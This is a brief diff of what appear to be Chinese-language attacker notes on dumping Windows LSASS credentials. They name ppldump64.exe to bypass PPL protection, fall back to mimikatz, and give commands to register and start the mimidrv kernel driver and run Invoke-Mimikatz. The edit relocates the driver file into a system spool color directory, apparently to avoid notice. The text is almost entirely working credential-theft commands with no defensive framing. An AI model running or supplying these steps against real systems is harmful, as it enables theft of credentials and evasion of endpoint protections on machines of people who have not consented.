@@ -9,7 +9,7 @@ can use ppldump64.exe 来绕过ppl并 dump lsass
 如果没有
 那就用mimikatz
 
-sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
+sc create mimidrv binPath=C:\Windows\system32\spool\drivers\color\mimidrv.sys type=kernel start=demand
 sc start mimidrv
 
 invoke-mimikatz          注意转义
